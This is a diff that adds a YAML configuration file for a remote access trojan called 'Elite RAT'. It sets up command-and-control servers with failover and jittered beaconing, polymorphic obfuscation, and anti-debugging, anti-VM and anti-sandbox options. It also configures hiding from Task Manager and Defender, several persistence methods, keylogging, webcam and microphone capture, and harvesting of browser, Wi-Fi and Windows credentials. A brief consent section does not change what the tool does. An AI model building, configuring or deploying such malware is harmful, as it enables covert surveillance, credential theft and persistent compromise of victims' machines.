@@ -1,0 +1,180 @@
+# Elite RAT Configuration File
+# WARNING: This file contains sensitive configuration
+# NEVER commit with real values to version control
+
+# C2 Server Configuration
+c2:
+  host: "0.0.0.0"  # Listen on all interfaces
+  port: 4444
+  ssl_enabled: false
+  ssl_cert: ""
+  ssl_key: ""
+  auth_token: "CHANGE_THIS_SECRET_TOKEN"
+  
+  # Backup C2 servers (for failover)
+  backup_servers:
+    - host: "backup1.example.com"
+      port: 443
+    - host: "backup2.example.com" 
+      port: 8443
+  
+  # Communication settings
+  beacon_interval: 60  # seconds
+  beacon_jitter: 10  # random +/- seconds
+  timeout: 300  # seconds
+  max_retries: 3
+  
+# Web Application Configuration  
+webapp:
+  host: "0.0.0.0"
+  port: 5000
+  debug: false
+  secret_key: "CHANGE_THIS_SECRET_KEY"
+  
+  # Admin credentials
+  admin_user: "admin"
+  admin_password: "CHANGE_THIS_PASSWORD"
+  
+  # Session settings
+  session_timeout: 3600  # seconds
+  max_sessions_per_user: 3
+  
+# Database Configuration
+database:
+  type: "sqlite"  # sqlite, mysql, postgresql
+  path: "/workspace/data/elite.db"  # For SQLite
+  
+  # For MySQL/PostgreSQL:
+  # host: "localhost"
+  # port: 3306
+  # name: "elite_rat"
+  # user: "elite_user"
+  # password: "CHANGE_THIS"
+  
+  # Connection pool
+  pool_size: 10
+  max_overflow: 20
+  
+# Payload Configuration
+payload:
+  templates_dir: "/workspace/templates/"
+  output_dir: "/workspace/generated/"
+  
+  # Obfuscation settings
+  obfuscation_level: 3  # 1-5, higher = more obfuscation
+  polymorphic: true
+  encrypt_strings: true
+  
+  # Anti-analysis
+  anti_debug: true
+  anti_vm: true
+  anti_sandbox: true
+  
+# Encryption Configuration
+crypto:
+  algorithm: "AES-256-GCM"
+  key_size: 256
+  keys_dir: "/workspace/keys/"
+  rotate_keys: true
+  rotation_interval: 86400  # seconds (24 hours)
+  
+# Logging Configuration
+logging:
+  level: "INFO"  # DEBUG, INFO, WARNING, ERROR, CRITICAL
+  dir: "/workspace/logs/"
+  max_size: 10485760  # 10MB
+  backup_count: 5
+  encrypt_logs: true
+  console_output: false  # Set to false for stealth
+  
+# Stealth Configuration
+stealth:
+  hide_console: true
+  disable_error_reporting: true
+  clear_logs_on_exit: true
+  use_code_signing: false
+  
+  # Process hiding
+  hide_from_taskmgr: true
+  hide_from_defender: true
+  
+  # Network hiding  
+  use_domain_fronting: false
+  cdn_domains:
+    - "cloudfront.net"
+    - "akamai.net"
+  
+  # Traffic mimicry
+  mimic_https: true
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+  
+# Persistence Configuration
+persistence:
+  methods:
+    - registry_run
+    - scheduled_task
+    - service
+    - startup_folder
+  
+  redundancy: true  # Use multiple methods
+  
+  # Backup persistence
+  check_interval: 300  # seconds
+  auto_reinstall: true
+  
+# Advanced Features
+features:
+  keylogger: true
+  screenshot: true
+  webcam: true
+  microphone: true
+  clipboard: true
+  file_browser: true
+  process_manager: true
+  
+  # Credential harvesting
+  harvest_browsers: true
+  harvest_wifi: true
+  harvest_windows: true
+  
+# Paths Configuration  
+paths:
+  temp_dir: "/tmp/elite/"
+  staging_dir: "/workspace/staging/"
+  modules_dir: "/workspace/modules/"
+  
+# Network Configuration
+network:
+  proxy:
+    enabled: false
+    type: "SOCKS5"  # HTTP, SOCKS4, SOCKS5
+    host: ""
+    port: 1080
+    username: ""
+    password: ""
+  
+  # DNS settings (for DNS tunneling)
+  dns:
+    enabled: false
+    domain: "example.com"
+    resolver: "8.8.8.8"
+    
+# Development/Testing
+development:
+  test_mode: false
+  skip_auth: false
+  verbose_errors: false
+  allow_localhost: true
+  
+# Legal/Compliance
+legal:
+  require_consent: true
+  audit_logging: true
+  data_retention_days: 30
+  
+# Auto-update Configuration
+updates:
+  enabled: false
+  check_interval: 86400  # seconds
+  update_server: "https://update.example.com"
+  verify_signature: true
